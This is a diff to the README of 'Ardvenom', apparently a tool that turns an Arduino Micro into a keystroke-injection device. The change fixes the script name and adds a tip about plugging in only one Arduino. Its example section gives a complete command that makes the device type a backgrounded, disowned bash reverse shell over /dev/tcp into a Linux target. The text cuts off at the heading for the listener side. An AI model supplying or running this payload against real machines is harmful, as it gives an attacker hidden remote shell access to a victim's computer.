@@ -24,19 +24,21 @@ newgrp uucp
 
 ## Usage
 
-Plug your Arduino Micro using USB cable.
+Plug your Arduino Micro using USB cable (make sure it's the only pluged Arduino).
+
+
 ![arduino](https://github.com/j4ckst0ne37/Ardvenom/blob/main/arduino.jpg?raw=true)
 
 Run ardvenom.py
 ```bash
-./ardvenom -o OS -l KEYBOARD_LAYOUT -c CMD
+./ardvenom.py -o OS -l KEYBOARD_LAYOUT -c CMD
 ```
 ## Example
 
 To make a simple reverse-shell for a Linux target.
 
 ```bash
-./ardvenom -o linux -l qwerty -c "nohup bash -i >& /dev/tcp/IP/PORT 0>&1 > /dev/null & disown && exit"
+./ardvenom.py -o linux -l qwerty -c "nohup bash -i >& /dev/tcp/IP/PORT 0>&1 > /dev/null & disown && exit"
 ```
 In the other side
 ```bash
